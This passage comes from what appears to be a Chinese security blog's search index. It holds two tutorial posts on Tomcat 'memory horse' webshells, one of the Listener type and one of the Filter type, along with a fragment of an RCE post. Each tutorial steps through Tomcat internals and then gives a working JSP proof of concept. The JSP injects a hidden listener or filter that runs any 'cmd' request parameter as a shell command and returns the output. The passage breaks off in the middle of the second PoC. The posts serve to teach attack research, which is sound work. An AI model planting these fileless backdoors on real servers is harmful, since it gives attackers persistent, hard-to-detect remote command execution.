如果攻击成功，恶意代码会被写入该文件。\n\n后来看了p牛的文章才知道`$SERVER`并不认为&符号是参数的分隔符，而是将+号作为分隔符\n\n注意:在传参的时候不能用hackbar，因为`<`和`>`会被hackbar编码而不会生效\n\n","tags":["RCE和文件包含"],"categories":["对于RCE和文件包含的一点总结"]},{"title":"Java内存马之Listener型内存马","url":"/2025/08/25/Java内存马之Listener型内存马/","content":"\n参考文章：\n\nhttps://xz.aliyun.com/news/13078\n\nhttps://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Listener%E5%9E%8B/\n\nhttps://xz.aliyun.com/news/13080\n\nhttps://github.com/Y4tacker/JavaSec/blob/main/5.%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/Tomcat/Tomcat-Listener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Listener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC.md\n\n## 0x01 关于Listener监听器\n\n![img](../image/achieve/202411/java学习/20240211001946-34c81f0a-c830-1-1756104784707-3.jpeg)\n\n从上面的图片以及之前介绍servlet处理逻辑的时候可以知道，当我们发送请求的时候的顺序是Listener->Filter->Servlet，Listener是最先被加载的\n\n在 **Java Web** 中，**Listener（监听器）**是一类用于监听和响应 **Web 应用中发生的特定事件** 的组件。它是一种 **事件驱动机制**，可以让开发者在事件发生时自动执行一些逻辑，而无需手动调用。\n\n在`tomcat`中，常见的`Listener`有以下几种：\n\n1. **ServletContextListener** ：用来监听整个`Web`应用程序的启动和关闭事件，需要实现`contextInitialized`和`contextDestroyed`这两个方法\n2. **HttpSessionListener**：用来监听`HTTP`会话的创建和销毁事件，需要实现`sessionCreated`和`sessionDestroyed`这两个方法\n3. **ServletRequestListener**：用来监听`HTTP`请求的创建和销毁事件，需要实现`requestInitialized`和`requestDestroyed`这两个方法\n4. **HttpSessionAttributeListener**：监听`HTTP`会话属性的添加、删除和替换事件，需要实现`attributeAdded`、`attributeRemoved`和`attributeReplaced`这三个方法。\n\n从上面不难看出，使用ServletRequestListener是最适合用来做内存马的了，因为只要发送了http请求他都会触发监听\n\n## 0x02 实现Listener的Demo\n\n我们先看看ServletRequestListener接口需要实现的方法\n\n```java\n//\n// Source code recreated from a .class file by IntelliJ IDEA\n// (powered by FernFlower decompiler)\n//\n\npackage javax.servlet;\n\nimport java.util.EventListener;\n\npublic interface ServletRequestListener extends EventListener {\n    default void requestDestroyed(ServletRequestEvent sre) {\n    }\n\n    default void requestInitialized(ServletRequestEvent sre) {\n    }\n}\n\n```\n\n**requestInitialized：**在request对象创建时触发\n\n**requestDestroyed：**在request对象销毁时触发\n\n然后写个demo\n\n```java\npackage org.example;\n\nimport javax.servlet.ServletRequestEvent;\nimport javax.servlet.ServletRequestListener;\n\npublic class TestListener implements ServletRequestListener {\n    @Override\n    public void requestInitialized(ServletRequestEvent sre) {\n        System.out.println(\"initial TestListener\");\n    }\n\n    @Override\n    public void requestDestroyed(ServletRequestEvent sre) {\n        System.out.println(\"destroyed TestListener\");\n    }\n}\n```\n\n然后在web.xml中添加监听器\n\n```java\n  <listener>\n    <listener-class>org.example.TestListener</listener-class>\n  </listener>\n```\n\n然后我们运行起来看看呢\n\n![image-20250825152429591](../image/achieve/202411/java学习/image-20250825152429591.png)\n\n这里的话之前写的filter过滤器还在，自行忽略一下\n\n## 0x03 从代码层面分析Listener运行的整体流程\n\n分别在class和requestInitialized函数上分别打上断点\n\n![image-20250825153310723](../image/achieve/202411/java学习/image-20250825153310723.png)\n\n在函数调用栈中看到一个listenerStart函数，跟进看一下\n\n![image-20250825153355191](../image/achieve/202411/java学习/image-20250825153355191.png)\n\n```java\n// Instantiate the required listeners\n        String[] listeners = findApplicationListeners();\n        Object[] results = new Object[listeners.length];\n        boolean ok = true;\n        for (int i = 0; i < results.length; i++) {\n            if (getLogger().isTraceEnabled()) {\n                getLogger().trace(\" Configuring event listener class '\" + listeners[i] + \"'\");\n            }\n            try {\n                String listener = listeners[i];\n                results[i] = getInstanceManager().newInstance(listener);\n```\n\n可以看到listener是来源于listeners，然后这个listeners是通过调用findApplicationListeners函数来的，随后用newInstance去实例化监听器\n\n![image-20250825154258262](../image/achieve/202411/java学习/image-20250825154258262.png)\n\n这里可以看出是在实例化我们刚刚写的TestListener，接下来会遍历得到的results中的listener，根据不同类型放入不同的数组中\n\n![image-20250825154810155](../image/achieve/202411/java学习/image-20250825154810155.png)\n\n```java\n        // Sort listeners in two arrays\n        List<Object> eventListeners = new ArrayList<>();\n        List<Object> lifecycleListeners = new ArrayList<>();\n        for (Object result : results) {\n            if ((result instanceof ServletContextAttributeListener) ||\n                    (result instanceof ServletRequestAttributeListener) || (result instanceof ServletRequestListener) ||\n                    (result instanceof HttpSessionIdListener) || (result instanceof HttpSessionAttributeListener)) {\n                eventListeners.add(result);\n            }\n            if ((result instanceof ServletContextListener) || (result instanceof HttpSessionListener)) {\n                lifecycleListeners.add(result);\n            }\n        }\n```\n\n这里的话可以看到我们的ServletRequestListener是放入eventListeners的\n\n继续往下看\n\n![image-20250825160456853](../image/achieve/202411/java学习/image-20250825160456853.png)\n\n```java\n        eventListeners.addAll(Arrays.asList(getApplicationEventListeners()));\n        setApplicationEventListeners(eventListeners.toArray());\n```\n\n调用getApplicationEventListeners()方法去返回当前注册的监听器applicationEventListenersList中的值，然后将数组转化成列表并将内容添加到eventListeners中，我们跟进getApplicationEventListeners看看\n\n```java\n    @Override\n    public Object[] getApplicationEventListeners() {\n        return applicationEventListenersList.toArray();\n    }\n```\n\n很简单，就是将applicationEventListenersList转化成数组，但是调试之后发现这里是空的\n\n![image-20250825161014309](../image/achieve/202411/java学习/image-20250825161014309.png)\n\n在 **Tomcat 或类似 Java Web 容器** 中，`applicationEventListenersList`通常是一个 **List**，用来存放 **当前 Web 应用注册的所有事件监听器对象实例**。\n\n从这里其实可以看出，tomcat中的listener主要有两个来源，一个是来源于web.xml或者注解`@WebListener`实例化得到的listener，一个就是从applicationEventListenersList中实例化listener，那我们只要在applicationEventListenersList中添加listener就可以实现动态注册listener监听器了\n\n然后我们来到第二个断点\n\n![image-20250825161519932](../image/achieve/202411/java学习/image-20250825161519932.png)\n\n在函数调用栈中看到一个fireRequestInitEvent函数\n\n![image-20250825161617726](../image/achieve/202411/java学习/image-20250825161617726.png)\n\n在fireRequestInitEvent()函数中可以看到这里先是用getApplicationEventListeners函数去获取监听器实例对象instances，随后遍历instances并调用每个监听器对象的requestInitialized方法。\n\n## 0x04 Listener内存马实现\n\n从上面的分析我们可以知道，只要能获取到applicationEventListenersList并在applicationEventListenersList中添加listener就可以实现动态注册了，那是否有像之前一样的add函数呢？当然有啦\n\n在org.apache.catalina.core.StandardContext类中的addApplicationEventListener方法\n\n```java\n    public void addApplicationEventListener(Object listener) {\n        applicationEventListenersList.add(listener);\n    }\n```\n\n这里教大家怎么找啊，我们直接定位到那个变量applicationEventListenersList，然后在所有位置查找用法\n\n![image-20250825162843892](../image/achieve/202411/java学习/image-20250825162843892.png)\n\n然后就可以看到这个变量被用到的地方了\n\n所以我们的Listener内存马实现步骤:\n\n- 继承并编写一个恶意Listener\n- 获取StandardContext\n- 调用`StandardContext.addApplicationEventListener()`添加恶意Listener\n\n### 最终的poc\n\n```java\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.connector.Request\" %>\n<%@ page import=\"java.io.InputStream\" %>\n<%@ page import=\"java.util.Scanner\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n<%!\n    public class listenershell implements ServletRequestListener {\n        @Override\n        public void requestDestroyed(ServletRequestEvent sre) {\n            HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();\n            String cmd = req.getParameter(\"cmd\");\n            if (cmd != null) {\n                boolean islinux = true;\n                String osType = System.getProperty(\"os.name\");\n                if (osType != null && osType.toLowerCase().contains(\"win\")) {\n                    islinux = false;\n                }\n                String[] cmdArray = islinux ? new String[]{\"sh\",\"-c\",cmd} : new String[]{\"cmd.exe\",\"/c\",cmd};//根据操作系统选择不同的shell\n                //执行命令并获取输出\n                try{\n                    InputStream in = Runtime.getRuntime().exec(cmdArray).getInputStream();\n                    Scanner s = new Scanner(in).useDelimiter(\"\\\\a\");  //使用 Scanner 读取 InputStream 的内容\n                    String output = s.hasNext() ? s.next() : \"\";  //如果有内容就读取，否则为空字符串\n                    Field rep = req.getClass().getDeclaredField(\"request\");  //获取 Servlet 输出流，用于返回给客户端（浏览器）\n                    rep.setAccessible(true);\n                    Request request = (Request) rep.get(req);\n                    request.getResponse().getWriter().write(output);\n                } catch (IOException e){\n                } catch (NoSuchFieldException e){\n                } catch (IllegalAccessException  e){}\n            }\n        }\n    }\n%>\n<%\n    //反射获取StandardContext\n//    ServletContext servletContext = request.getServletContext();\n//    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n//    appctx.setAccessible(true);\n//    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n//    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n//    stdctx.setAccessible(true);\n//    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n    // 更简单的方法 获取StandardContext\n    Field reqF = request.getClass().getDeclaredField(\"request\");\n    reqF.setAccessible(true);\n    Request req = (Request) reqF.get(request);\n    StandardContext standardContext = (StandardContext) req.getContext();\n    listenershell listenershell = new listenershell();\n    standardContext.addApplicationEventListener(listenershell);\n    out.println(\"inject success\");\n%>\n\n```\n\n访问listenershell.jsp之后随便发送一个请求并传入cmd参数执行命令就可以了\n\n这个内存马的话操作不多，就一个addApplicationEventListener添加listener对象，就不再赘述了\n","tags":["java内存马"],"categories":["javasec"]},{"title":"Java内存马之Filter型内存马","url":"/2025/08/21/Java内存马之Filter型内存马/","content":"\n参考文章：\n\nhttps://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%9E%8B/\n\nhttps://xz.aliyun.com/news/13078#24-filter%E5%AE%B9%E5%99%A8%E4%B8%8Efilterdefsfilterconfigsfiltermapsfilterchain\n\nhttps://github.com/Y4tacker/JavaSec/blob/main/5.%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/Tomcat/Tomcat-Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC.md\n\n## 0x01关于Filter过滤器\n\nFilter顾名思义就是过滤器的意思，这个之前php的时候也接触过不少了\n\n之前研究servlet的时候就可以知道，当tomcat接收到请求时候，依次会经过Listener -> Filter -> Servlet\n\n在tomcat中，filter是位于客户端请求和目标资源servlet之间的，可以对请求和响应进行拦截和过滤处理的一种组件容器\n\n这里放一个师傅的图\n\n![img](../image/achieve/202411/java学习/20220216173834.png)\n\n由途中不难看出，我们的请求在经过servlet之前会经过filter，这个filter可能是一层也可能是多层，但最终都会在servlet对请求进行拦截处理，那么我们可以得出一个思路：如果我们动态创建一个filter并放在最前面，那么我们的filter就会最先执行，若我们创建的filter中存在恶意代码，那么就可以实现恶意代码执行，形成内存马。\n\n## 0x02实现Filter的Demo\n\n我们先写一个TestFilter\n\n因为Servlet规范力定义了一个Filter接口，如果需要实现一个过滤器的话就需要实现filter接口，我们看看这个接口有哪些函数方法\n\n```java\n//\n// Source code recreated from a .class file by IntelliJ IDEA\n// (powered by FernFlower decompiler)\n//\n\npackage javax.servlet;\n\nimport java.io.IOException;\n\npublic interface Filter {\n    default void init(FilterConfig filterConfig) throws ServletException {\n    }\n\n    void doFilter(ServletRequest var1, ServletResponse var2, FilterChain var3) throws IOException, ServletException;\n\n    default void destroy() {\n    }\n}\n```\n\n那根据这个接口的方法去写一下\n\n```java\npackage org.example;\n\nimport javax.servlet.*;\nimport java.io.IOException;\n\npublic class TestFilter implements Filter {\n    @Override\n    public void init(FilterConfig filterConfig) throws ServletException {\n        System.out.println(\"Filter init\");\n    }\n\n    @Override\n    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {\n        System.out.println(\"Filter doFilter\");\n\n        //放行请求\n        chain.doFilter(request, response);\n    }\n\n    @Override\n    public void destroy() {\n        System.out.println(\"Filter destroy\");\n    }\n}\n```\n\n然后我们配置一下xml\n\n```xml\n  <filter>\n    <filter-name>TestFilter</filter-name>\n    <filter-class>org.example.TestFilter</filter-class>\n  </filter>\n  <filter-mapping>\n    <filter-name>TestFilter</filter-name>\n    <url-pattern>/*</url-pattern>\n  </filter-mapping>\n```\n\n需要解释一下`/*` 表示匹配所有请求（无论访问哪个路径都会经过 `TestFilter`）。\n\n## 0x03Filter源码分析\n\n感觉这里的分析不太详细，另外的分析额外写在了0x05中\n\n### 从代码层面看Filter的运行流程\n\n然后我们在doFilter方法打下断点并启动服务器\n\n![image-20250822115112927](../image/achieve/202411/java学习/image-20250822115112927.png)\n\n跟进org.apache.catalina.core.StandardWrapperValve#invoke()\n\n![image-20250822120252710](../image/achieve/202411/java学习/image-20250822120252710.png)\n\n```java\nfilterChain.doFilter(request.getRequest(), response.getResponse());\n```\n\n我们跟进这个filterChain看看他怎么得来的\n\n```java\nApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);\n```\n\n跟进createFilterChain方法\n\n![image-20250822120739723](../image/achieve/202411/java学习/image-20250822120739723.png)\n\n```java\n    public static ApplicationFilterChain createFilterChain(ServletRequest request, Wrapper wrapper, Servlet servlet) {\n\n        // If there is no servlet to execute, return null\n        if (servlet == null) {\n            return null;\n        }\n\n        // Create and initialize a filter chain object\n        ApplicationFilterChain filterChain;\n        if (request instanceof Request) {\n            Request req = (Request) request;\n            if (Globals.IS_SECURITY_ENABLED) {\n                // Security: Do not recycle\n                filterChain = new ApplicationFilterChain();\n            } else {\n                filterChain = (ApplicationFilterChain) req.getFilterChain();\n                if (filterChain == null) {\n                    filterChain = new ApplicationFilterChain();\n                    req.setFilterChain(filterChain);\n                }\n            }\n        } else {\n            // Request dispatcher in use\n            filterChain = new ApplicationFilterChain();\n        }\n\n        filterChain.setServlet(servlet);\n        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());\n\n        // Acquire the filter mappings for this Context\n        StandardContext context = (StandardContext) wrapper.getParent();\n        FilterMap filterMaps[] = context.findFilterMaps();\n\n        // If there are no filter mappings, we are done\n        if (filterMaps == null || filterMaps.length == 0) {\n            return filterChain;\n        }\n\n        // Acquire the information we will need to match filter mappings\n        DispatcherType dispatcher = (DispatcherType) request.getAttribute(Globals.DISPATCHER_TYPE_ATTR);\n\n        String requestPath = FilterUtil.getRequestPath(request);\n\n        String servletName = wrapper.getName();\n\n        // Add the relevant path-mapped filters to this filter chain\n        for (FilterMap filterMap : filterMaps) {\n            if (!matchDispatcher(filterMap, dispatcher)) {\n                continue;\n            }\n            if (!FilterUtil.matchFiltersURL(filterMap, requestPath)) {\n                continue;\n            }\n            ApplicationFilterConfig filterConfig =\n                    (ApplicationFilterConfig) context.findFilterConfig(filterMap.getFilterName());\n            if (filterConfig == null) {\n                log.warn(sm.getString(\"applicationFilterFactory.noFilterConfig\", filterMap.getFilterName()));\n                continue;\n            }\n            filterChain.addFilter(filterConfig);\n        }\n\n        // Add filters that match on servlet name second\n        for (FilterMap filterMap : filterMaps) {\n            if (!matchDispatcher(filterMap, dispatcher)) {\n                continue;\n            }\n            if (!matchFiltersServlet(filterMap, servletName)) {\n                continue;\n            }\n            ApplicationFilterConfig filterConfig =\n                    (ApplicationFilterConfig) context.findFilterConfig(filterMap.getFilterName());\n            if (filterConfig == null) {\n                log.warn(sm.getString(\"applicationFilterFactory.noFilterConfig\", filterMap.getFilterName()));\n                continue;\n            }\n            filterChain.addFilter(filterConfig);\n        }\n\n        // Return the completed filter chain\n        return filterChain;\n    }\n```\n\n该函数接收一个请求对象，一个Wrapper对象和一个servlet目标实例，其实就是在客户端请求和目标servlet之间建立一个filter过滤器链\n\n这里的话会先判断servlet是否为空，如果是那么就表示请求的servlet不是一个有效的servlet，就返回一个null。之后创建和初始化一个过滤器链对象filterChain，根据传入的ServletRequest判断如果是request类型就并且开启了安全模式的话每次就会新创建一个filterChain，如果没开启那就尝试调用`getFilterChain()`从请求中获取现有的过滤器链，如果没获取到就新建一个新的filterChain并调用`setFilterChain()`设置filterChain。\n\n然后就是设置filterChain的servlet，标记servlet是否支持异步，随后就是关键的地方了\n\n从`Wrapper`中获取父级上下文（`StandardContext`），然后获取该上下文中定义的过滤器映射数组（`FilterMap`），`filterMaps` 保存了 web.xml / 注解里的所有 `<filter-mapping>`。\n\n![image-20250822144046538](../image/achieve/202411/java学习/image-20250822144046538.png)\n\n这里可以看到filterMaps中的filterMap主要存放了一些过滤器的名字以及作用的url等\n\n之后提取关键的信息例如请求路径，目标servlet名字等\n\n接下来会遍历filterMaps中的filterMap，如果发现请求的url和filterMap中的urlPattern匹配的话就通过filtername名字查找对应的filterconfig，找到就会将其添加到filter过滤器链中\n\n![image-20250822144303652](../image/achieve/202411/java学习/image-20250822144303652.png)\n\n例如看看filterconfig的内容\n\n![image-20250822144554648](../image/achieve/202411/java学习/image-20250822144554648.png)\n\n这里包含了filtername名字、filterclass所属类、filter以及filterDef\n\n到这里filterchain就完成了创建，回到刚刚的doFilter方法中\n\n```java\n    public void doFilter(ServletRequest request, ServletResponse response) throws IOException, ServletException {\n\n        if (Globals.IS_SECURITY_ENABLED) {\n            final ServletRequest req = request;\n            final ServletResponse res = response;\n            try {\n                java.security.AccessController.doPrivileged((java.security.PrivilegedExceptionAction<Void>) () -> {\n                    internalDoFilter(req, res);\n                    return null;\n                });\n            } catch (PrivilegedActionException pe) {\n                Exception e = pe.getException();\n                if (e instanceof ServletException) {\n                    throw (ServletException) e;\n                } else if (e instanceof IOException) {\n                    throw (IOException) e;\n                } else if (e instanceof RuntimeException) {\n                    throw (RuntimeException) e;\n                } else {\n                    throw new ServletException(e.getMessage(), e);\n                }\n            }\n        } else {\n            internalDoFilter(request, response);\n        }\n    }\n```\n\n先判断是否是安全模式，这里是false，则直接调用else的internalDoFilter方法，步入该方法\n\n```java\n    private void internalDoFilter(ServletRequest request, ServletResponse response)\n            throws IOException, ServletException {\n\n        // Call the next filter if there is one\n        if (pos < n) {\n            ApplicationFilterConfig filterConfig = filters[pos++];\n            try {\n                Filter filter = filterConfig.getFilter();\n\n                if (request.isAsyncSupported() && !(filterConfig.getFilterDef().getAsyncSupportedBoolean())) {\n                    request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE);\n                }\n                if (Globals.IS_SECURITY_ENABLED) {\n                    final ServletRequest req = request;\n                    final ServletResponse res = response;\n                    Principal principal = ((HttpServletRequest) req).getUserPrincipal();\n\n                    Object[] args = new Object[] { req, res, this };\n                    SecurityUtil.doAsPrivilege(\"doFilter\", filter, classType, args, principal);\n                } else {\n                    filter.doFilter(request, response, this);\n                }\n            } catch (IOException | ServletException | RuntimeException e) {\n                throw e;\n            } catch (Throwable e) {\n                e = ExceptionUtils.unwrapInvocationTargetException(e);\n                ExceptionUtils.handleThrowable(e);\n                throw new ServletException(sm.getString(\"filterChain.filter\"), e);\n            }\n            return;\n        }\n\n        // We fell off the end of the chain -- call the servlet instance\n        try {\n            if (ApplicationDispatcher.WRAP_SAME_OBJECT) {\n                lastServicedRequest.set(request);\n                lastServicedResponse.set(response);\n            }\n\n            if (request.isAsyncSupported() && !servletSupportsAsync) {\n                request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE);\n            }\n            // Use potentially wrapped request from this point\n            if ((request instanceof HttpServletRequest) && (response instanceof HttpServletResponse) &&\n                    Globals.IS_SECURITY_ENABLED) {\n                final ServletRequest req = request;\n                final ServletResponse res = response;\n                Principal principal = ((HttpServletRequest) req).getUserPrincipal();\n                Object[] args = new Object[] { req, res };\n                SecurityUtil.doAsPrivilege(\"service\", servlet, classTypeUsedInService, args, principal);\n            } else {\n                servlet.service(request, response);\n            }\n        } catch (IOException | ServletException | RuntimeException e) {\n            throw e;\n        } catch (Throwable e) {\n            e = ExceptionUtils.unwrapInvocationTargetException(e);\n            ExceptionUtils.handleThrowable(e);\n            throw new ServletException(sm.getString(\"filterChain.servlet\"), e);\n        } finally {\n            if (ApplicationDispatcher.WRAP_SAME_OBJECT) {\n                lastServicedRequest.set(null);\n                lastServicedResponse.set(null);\n            }\n        }\n    }\n```\n\n其实就是一个按顺序执行filter，最后调用最终的servlet的过程\n\n这里会从filters中依次拿到filter和filterConfig，最终调用`filter.doFilter()`\n\n到这里的话其实调试就完了\n\n### 从代码层面看Filter的初始化流程\n\n这次我们打个断点在init方法，因为这里的话肯定是初始化的时候\n\n在`org.apache.catalina.core.StandardContext#filterStart`\n\n![image-20250822161547169](../image/achieve/202411/java学习/image-20250822161547169.png)\n\n首先对filterDefs进行foreach，我们看看这个filterDefs的值是HashMap类型的键值对类型，内容就是过滤器名称和一个filterDefs对象\n\n![image-20250822162338463](../image/achieve/202411/java学习/image-20250822162338463.png)\n\n这样看的话就很明了了，filterDefs对象的值就是这些，那filterDefs如何添加呢？StandardContext里面有一个add方法\n\n```java\n    @Override\n    public void addFilterDef(FilterDef filterDef) {\n\n        synchronized (filterDefs) {\n            filterDefs.put(filterDef.getFilterName(), filterDef);\n        }\n        fireContainerEvent(\"addFilterDef\", filterDef);\n\n    }\n```\n\n我们继续往下看\n\n![image-20250822163022498](../image/achieve/202411/java学习/image-20250822163022498.png)\n\n这里对filterConfigs这个HashMap设置ApplicationFilterConfig，具体跟进看看\n\n![image-20250822163856303](../image/achieve/202411/java学习/image-20250822163856303.png)\n\n参数中context就是一个StandardContext对象，filterDef就是一个filterDef对象\n\n这里的话主要是两种处理方式\n\n```java\n        if (filterDef.getFilter() == null) {\n            getFilter();\n        } else {\n            this.filter = filterDef.getFilter();\n            context.getInstanceManager().newInstance(filter);\n            initFilter();\n        }\n```\n\n1. 首先判断filterDef.getFilter()检查是否有filter实例，为空则通过getFilter()去实例化一个filter\n2. 如果不为空的话就getFilter()去获取该实例\n\n跟进getFilter看看类里有什么方法\n\n![image-20250822164815456](../image/achieve/202411/java学习/image-20250822164815456.png)\n\n刚好有一个setter方法可以用，并且还是public类型的\n\n结合上面的addFilterDef就可以将Filter实例设置并添加进去\n\n```java\nFilterDef filterdef = new FilterDef();\nfilterdef.setFilter(filter);\nstandardContext.addFilterDef(filterdef)\n```\n\n## 0x04Filter内存马实现\n\n其实从上面的代码中不难看出在createFilterChain方法中有两个很重要的方法`org.apache.catalina.core.StandardContext#findFilterMaps`和`org.apache.catalina.core.StandardContext#findFilterConfig`，这两个方法是用来获取FilterMap和FilterConfig的\n\n```java\n    @Override\n    public FilterMap[] findFilterMaps() {\n        return filterMaps.asArray();\n    }\n    public FilterConfig findFilterConfig(String name) {\n        synchronized (filterDefs) {\n            return filterConfigs.get(name);\n        }\n    }\n```\n\n看到这两个方法的实现，其实就是从StandardContext中提取到对应的属性filtermap和filterconfig，那么我们只要往这2个属性里面插入对应的filterMap和filterConfig即可实现动态添加filter的目的\n\n我们找找有没有setter方法，如果有的话就直接调用去设置值就行了\n\n首先我们来看filtermaps，StandardContext提供了对应的添加方法\n\n![image-20250822155617361](../image/achieve/202411/java学习/image-20250822155617361.png)\n\n这里的话直接用addFilterMapBefore就行了，`addFilterMapBefore`则会自动把我们创建的`filterMap`丢到第一位去，无需再手动排序\n\n然后我们来看一下filterconfig怎么添加，在StandardContext中并没有找到filterconfig有关的添加方法，但是还记得刚刚我们的filterStart方法吗，他里面有一个put添加filterconfig的流程\n\n![image-20250822170351048](../image/achieve/202411/java学习/image-20250822170351048.png)\n\n那也就是说，我们只能通过反射的方法去获取相关属性并添加进去。\n\n根据上面的所有流程，我们得知了我们只需要设置filterMaps、filterConfigs、filterDefs就可以注入恶意的filter\n\n- filterMaps：一个HashMap对象，包含过滤器名字和URL映射\n- filterDefs：一个HashMap对象，过滤器名字和过滤器实例的映射\n- filterConfigs变量：一个ApplicationFilterConfig对象，里面存放了filterDefs\n\n所以Filter内存马实现的流程就是：\n\n1. 获取StandardContext\n2. 继承并编写一个恶意filter\n3. 实例化一个FilterDef类，包装filter并存放到StandardContext.filterDefs中\n4. 实例化一个FilterMap类，将我们的 Filter 和 urlpattern 相对应，存放到StandardContext.filterMaps中(一般会放在首位)\n5. 通过反射获取filterConfigs，实例化一个FilterConfig(ApplicationFilterConfig)类，传入StandardContext与filterDefs，存放到filterConfig中\n\n这里需要注意一个问题就是在addFilterMap中的一个validateFilterMap方法\n\n![image-20250822171959102](../image/achieve/202411/java学习/image-20250822171959102.png)\n\n这里会根据filtername去查找对应的filterdef，不然的话会抛出一个报错，也就是说，我们得先写一个filterdef，然后再修改`filterMap`\n\n这里有个坑就是别忘了设置Dispatcher，这里我们设置DispatcherType.REQUEST.name()即可\n\nServlet 规范定义了几种 **分发类型**，也就是一个请求进入 Filter/Servlet 链的不同方式：\n\n- **`REQUEST`**\n   正常的 HTTP 请求（浏览器直接访问 URL 时）。\n- **`FORWARD`**\n   通过 `RequestDispatcher.forward()` 转发。\n- **`INCLUDE`**\n   通过 `RequestDispatcher.include()` 包含另一个资源。\n- **`ERROR`**\n   进入错误页面时（`<error-page>` 配置）。\n- **`ASYNC`**\n   异步请求（Servlet 3.0+ 支持）。\n\n```\npublic void setDispatcher(String dispatcherString) {\nString dispatcher = dispatcherString.toUpperCase(Locale.ENGLISH);\n\nif (dispatcher.equals(DispatcherType.FORWARD.name())) {\n// apply FORWARD to the global dispatcherMapping.\ndispatcherMapping |= FORWARD;\n} else if (dispatcher.equals(DispatcherType.INCLUDE.name())) {\n// apply INCLUDE to the global dispatcherMapping.\ndispatcherMapping |= INCLUDE;\n} else if (dispatcher.equals(DispatcherType.REQUEST.name())) {\n// apply REQUEST to the global dispatcherMapping.\ndispatcherMapping |= REQUEST;\n}  else if (dispatcher.equals(DispatcherType.ERROR.name())) {\n// apply ERROR to the global dispatcherMapping.\ndispatcherMapping |= ERROR;\n}  else if (dispatcher.equals(DispatcherType.ASYNC.name())) {\n// apply ERROR to the global dispatcherMapping.\ndispatcherMapping |= ASYNC;\n}\n}\n```\n\n### 最终的POC\n\n```jsp\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.util.Map\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page import=\"org.apache.tomcat.util.descriptor.web.FilterDef\" %>\n<%@ page import=\"org.apache.tomcat.util.descriptor.web.FilterMap\" %>\n<%@ page import=\"java.lang.reflect.Constructor\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationFilterConfig\" %>\n<%@ page import=\"org.apache.catalina.Context\" %>\n<%@ page import=\"java.io.InputStream\" %>\n<%@ page import=\"java.util.Scanner\" %>\n<%@ page import=\"java.io.PrintWriter\" %>\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n<%\n\n  //获取StandardContext\n  ServletContext servletContext = request.getServletContext();\n  Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n  appctx.setAccessible(true);\n  ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n  Field stdcx = applicationContext.getClass().getDeclaredField(\"context\");\n  stdcx.setAccessible(true);\n  StandardContext standardContext = (StandardContext) stdcx.get(applicationContext);\n\n  // 获取filterConfigs\n  Field filterConfigField = standardContext.getClass().getDeclaredField(\"filterConfigs\");\n  filterConfigField.setAccessible(true);\n  Map filterConfigs = (Map) filterConfigField.get(standardContext);\n\n  String filterName = \"FilterShell\";\n  if (filterConfigs.get(filterName) == null) {\n    Filter filter = new Filter() {\n      @Override\n      public void init(FilterConfig filterConfig) throws ServletException {\n\n      }\n\n      @Override\n      public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n        String cmd = servletRequest.getParameter(\"cmd\");\n        if (cmd != null){\n          boolean isLinux = true;\n          String osTyp = System.getProperty(\"os.name\");\n          if (osTyp != null && osTyp.toLowerCase().contains(\"win\")) {\n            isLinux = false;\n          }\n          String[] cmdArray = isLinux ? new String[]{\"sh\",\"-c\",cmd} : new String[]{\"cmd.exe\",\"/c\",cmd}; //根据操作系统选择shell\n          //执行命令并获取命令输出\n          InputStream in = Runtime.getRuntime().exec(cmdArray).getInputStream();\n          Scanner s = new Scanner(in).useDelimiter(\"\\\\a\");  //使用 Scanner 读取 InputStream 的内容\n          String output = s.hasNext() ? s.next() : \"\";  //如果有内容就读取，否则为空字符串\n          PrintWriter out = servletResponse.getWriter();  //获取 Servlet 输出流，用于返回给客户端（浏览器）\n          out.println(output);  //打印输出\n          out.flush();\n          out.close();\n        }\n        filterChain.doFilter(servletRequest,servletResponse);\n      }\n\n      @Override\n      public void destroy() {\n\n      }\n    };\n\n    //FilterDef\n    FilterDef filterDef = new FilterDef();\n    filterDef.setFilter(filter);\n    filterDef.setFilterName(filterName);\n    filterDef.setFilterClass(filter.getClass().getName());\n    standardContext.addFilterDef(filterDef);\n\n    // FilterMap\n    FilterMap filterMap = new FilterMap();\n    filterMap.addURLPattern(\"/*\");\n    filterMap.setFilterName(filterName);\n    filterMap.setDispatcher(DispatcherType.REQUEST.name());\n    standardContext.addFilterMapBefore(filterMap);\n\n\n    //ApplicationFilterConfig\n    Constructor constructor = 